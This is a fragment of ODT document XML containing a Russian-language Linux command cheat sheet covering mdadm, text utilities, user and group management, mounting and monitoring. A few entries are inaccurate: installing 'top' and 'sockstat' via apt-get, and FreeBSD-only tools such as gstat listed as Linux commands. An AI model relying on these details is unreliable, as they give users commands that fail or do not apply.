      <text:p text:style-name="P8"><text:span text:style-name="T1">Затем очищаем суперблоки на всех дисках, из которых он был собран:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T3">mdadm --zero-superblock /dev/sdb</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm --zero-superblock /dev/sdc</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm --zero-superblock /dev/sdd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Linux-</text:span><text:span text:style-name="T1">команды</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">для</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">работы</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">с</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">текстом</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">less</text:span><text:span text:style-name="T1">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1" loext:marker-style-name="T2"><text:span text:style-name="T3">head</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">tail</text:span><text:span text:style-name="T1"> - команды, которые показывают начало или конец файла соответственно. С флагом -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> покажут заданное количество строк, вместо 10 выводящихся по умолчанию. Команда вида </text:span><text:span text:style-name="T3">tail</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> 3 </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span><text:span text:style-name="T1"> выведет на экран три последние строчки файла </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> - выполняет в файле поиск по шаблону. Обязательно требует после себя наличие шаблона. Команда </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">hello</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span><text:span text:style-name="T1"> найдет в файле </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span><text:span text:style-name="T1"> все строки, в которых присутствует шаблон «</text:span><text:span text:style-name="T3">hello</text:span><text:span text:style-name="T1">», и выведет их на экран. Может использоваться совместно с другими командами.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">sort</text:span><text:span text:style-name="T1"> - сортирует строки текста по различным критериям. По умолчанию утилита сортирует строки по алфавиту. С флагом -</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> команда вида </text:span><text:span text:style-name="T3">sort</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span><text:span text:style-name="T1"> выполнит сортировку в обратном порядке: от </text:span><text:span text:style-name="T3">Z</text:span><text:span text:style-name="T1"> к </text:span><text:span text:style-name="T3">A</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">wc</text:span><text:span text:style-name="T1"> - утилита для подсчета количества слов, строк, байт и слов в файле. Без флагов команда выводит количества слов, строк и байт. С флагом -</text:span><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1"> показывает количество слов в объекте (строке или файле).</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">diff</text:span><text:span text:style-name="T1">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3">d</text:span><text:span text:style-name="T1">», а новые - «а».</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Пользователи и группы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">useradd</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1"> "</text:span><text:span text:style-name="T3">User</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Vasya</text:span><text:span text:style-name="T1">" -</text:span><text:span text:style-name="T3">g</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">admin</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">bin</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bash</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> - Создать пользователя </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1">, домашним каталогом будет создана директория /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1">, в качестве системной оболочки будет назначен /</text:span><text:span text:style-name="T3">bin</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bash</text:span><text:span text:style-name="T1">, пользователь будет включен в группу </text:span><text:span text:style-name="T3">admin</text:span><text:span text:style-name="T1">, кроме того, для учетной записи будет создан комментарий "</text:span><text:span text:style-name="T3">User</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Vasya</text:span><text:span text:style-name="T1">"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">useradd</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> - Создать пользователя </text:span><text:span text:style-name="T3">vasya</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">usermod</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1"> "</text:span><text:span text:style-name="T3">User</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">FTP</text:span><text:span text:style-name="T1">" -</text:span><text:span text:style-name="T3">g</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">system</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">ftp</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">ftpuser</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">bin</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">nologin</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ftpuser</text:span><text:span text:style-name="T1"> - Изменение пользователя</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">userdel</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> - Удалить пользователя с именем </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> и его домашнюю директорию</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">groupadd</text:span><text:span text:style-name="T1"> [ </text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">name</text:span><text:span text:style-name="T1"> ] - Создать группу с именем </text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">name</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chage</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">E</text:span><text:span text:style-name="T1"> 2005-12-31 </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> - Установить дату окончания действия учётной записи пользователя </text:span><text:span text:style-name="T3">vasya</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># groupdel [ group_name ] - Удалить группу group_name</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># groupmod -n test new_test - Переименовать группу test в new_test</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">newgrp</text:span><text:span text:style-name="T1"> - [</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1">]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8"><text:span text:style-name="T1">Если не указывать группу, основная группа будет назначена из файла /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">passwd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">grpck</text:span><text:span text:style-name="T1"> - Проверка корректности системных файлов учётных записей. Проверяется файл/</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">group</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">pwck</text:span><text:span text:style-name="T1"> - Проверка корректности системных файлов учётных записей. Проверяются файлы /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">passwd</text:span><text:span text:style-name="T1"> и /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">shadow</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">passwd</text:span><text:span text:style-name="T1"> - Изменить пароль текущего пользователя</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">passwd</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> - Изменить пароль пользователя </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> (может выполнять только </text:span><text:span text:style-name="T3">root</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Монтирование файловых систем</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">1 /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1"> - Монтировать устройство /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">1 в папку с именем /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">. точка монтирования, папка /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">, должна существовать</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">fuser</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">km</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">1 - Размонтировать устройство </text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">1 если оно заблокировано каким либо процессом</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">loop</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">iso</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">cdrom</text:span><text:span text:style-name="T1"> - Смонтировать фаил или образ </text:span><text:span text:style-name="T3">ISO</text:span><text:span text:style-name="T1"> в директорию /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">cdrom</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># mount /dev/hdb /mnt/cdrecorder - Монтировать cdrw или dvdrom</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vfat</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">5 /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">5 - Смонтировать раздел с файловой системой </text:span><text:span text:style-name="T3">FAT</text:span><text:span text:style-name="T1">32</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">cdrom</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">cdrom</text:span><text:span text:style-name="T1"> - Монтировать </text:span><text:span text:style-name="T3">cdrom</text:span><text:span text:style-name="T1"> или </text:span><text:span text:style-name="T3">dvdrom</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fd</text:span><text:span text:style-name="T1">0 /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">floppy</text:span><text:span text:style-name="T1"> - Монтировать </text:span><text:span text:style-name="T3">floppy</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1"> ( дисковод мягких дисков )</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hdc</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">cdrecorder</text:span><text:span text:style-name="T1"> - Монтировать </text:span><text:span text:style-name="T3">cdrw</text:span><text:span text:style-name="T1"> или </text:span><text:span text:style-name="T3">dvdrom</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sda</text:span><text:span text:style-name="T1">1 /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">usbdisk</text:span><text:span text:style-name="T1"> - Монтировать </text:span><text:span text:style-name="T3">USB</text:span><text:span text:style-name="T1"> устройство</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">smbfs</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">username</text:span><text:span text:style-name="T1">=</text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1">,</text:span><text:span text:style-name="T3">password</text:span><text:span text:style-name="T1">=</text:span><text:span text:style-name="T3">pass</text:span><text:span text:style-name="T1"> //</text:span><text:span text:style-name="T3">WinClient</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">share</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">share</text:span><text:span text:style-name="T1"> - Монтировать сетевую файловую систему </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">SMB</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">CIFS</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">umount</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">2 - Размонтировать без записи в файл /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">mtab</text:span><text:span text:style-name="T1">, используется в ситуациях, когда файл находится в режиме только чтение или жесткий диск переполнен</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">umount</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">2 - Размонтировать диск </text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">2, предварительно неоходимо выйти из точки монтирования /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">hda</text:span><text:span text:style-name="T1">2</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Мониторинг в ОС Linux \ ps \ top \ gstat \ vmstat \ iostat \ netstat </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">apt-get install top</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">apt-get install ganglia-monitor</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">apt-get install sysstat</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">apt-get install sockstat</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">У утилиты </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1"> есть параметры, которые облегают жизнь, их мы набираем в </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1">’</text:span><text:span text:style-name="T3">e</text:span><text:span text:style-name="T1"> когда он запущен:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">S</text:span><text:span text:style-name="T1"> - показать системные процессы, по умолчанию они не показываются</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">u</text:span><text:span text:style-name="T1"> - и имя пользователя, например </text:span><text:span text:style-name="T3">u</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">mysql</text:span><text:span text:style-name="T1"> покажет процессы запущенные от пользователя </text:span><text:span text:style-name="T3">mysql</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1"> - используем для сортировки, возможные параметры - </text:span><text:span text:style-name="T3">pri</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">size</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">res</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">cpu</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">time</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">threads</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">m</text:span><text:span text:style-name="T1"> - переключение между режимами отображения нагрузки и ввода-вывода</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">k</text:span><text:span text:style-name="T1"> - завершить процесс, ввод </text:span><text:span text:style-name="T3">pid</text:span><text:span text:style-name="T1"> процесса</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> - изменить приоритет процесса, вводим </text:span><text:span text:style-name="T3">pid</text:span><text:span text:style-name="T1"> процесса</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> - отображать статистику по определённому процесс</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> - показывает абсолютные запущенных процессов</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> 3 - показывает самые ресурсоёмкие приложения в данный момент</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">gstat</text:span><text:span text:style-name="T1"> - показывает использование дисков.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">gstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> - используется для вывода только активных устройств</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">vmstat</text:span><text:span text:style-name="T1"> - показывает состояние виртуальной памяти и буфера</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">vmstat</text:span><text:span text:style-name="T1"> 5 - отображает статистику раз в пять секунд</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">vmstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">z</text:span><text:span text:style-name="T1"> - показывает состояние буфера</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">vmstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">i</text:span><text:span text:style-name="T1"> - показывает состояние прерываний</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">iostat</text:span><text:span text:style-name="T1"> - выводит статистику по </text:span><text:span text:style-name="T3">I</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">O</text:span><text:span text:style-name="T1"> устройств</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">iostat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1">5 - показывать информацию по дискам, с периодичностью в пять секунд безостановочно</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">iostat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">dx</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1">5 - показывает расширенную статистику</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">iostat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">dx</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">vda</text:span><text:span text:style-name="T1"> 5 - показывает расширенную статистику</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1"> - показывает активные сетевые соединения.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1"> 1 - количество пакетов в настоящее время.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">ibt</text:span><text:span text:style-name="T1"> - вывод сетевых интерфейсов с разбивкой по </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1"> адресам, отображает объём трафика, количество ошибок, коллизий</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">rn</text:span><text:span text:style-name="T1"> - отображает таблицу маршрутизации</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Поиск нужного файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> / -</text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> - Найти все директории и файлы, принадлежащие пользователю </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1">. Поиск будет производиться, начиная с корневой директории (/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> / -</text:span><text:span text:style-name="T3">name</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">filedir</text:span><text:span text:style-name="T1"> - Найти директории и файлы с именем </text:span><text:span text:style-name="T3">filedir</text:span><text:span text:style-name="T1">. Поиск будет производиться, начиная с корневой директории (/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">usr</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bin</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">type</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">atime</text:span><text:span text:style-name="T1"> +20 - Найти все файлы в директории /</text:span><text:span text:style-name="T3">usr</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bin</text:span><text:span text:style-name="T1">, время последнего обращения к которым более 20 дней</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">usr</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bin</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">type</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">mtime</text:span><text:span text:style-name="T1"> -10 - Найти все файлы в директории /</text:span><text:span text:style-name="T3">usr</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bin</text:span><text:span text:style-name="T1">, которые были созданы или модифицированы в течении последних 10 дней</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> / -</text:span><text:span text:style-name="T3">xdev</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">name</text:span><text:span text:style-name="T1"> \*.</text:span><text:span text:style-name="T3">rpm</text:span><text:span text:style-name="T1"> - Искать директории и файлы, имена которых оканчиваются на ".</text:span><text:span text:style-name="T3">rpm</text:span><text:span text:style-name="T1">", но игнорируя съёмные накопители, </text:span><text:span text:style-name="T3">cdrom</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">usb</text:span><text:span text:style-name="T1"> и т. п.</text:span></text:p>
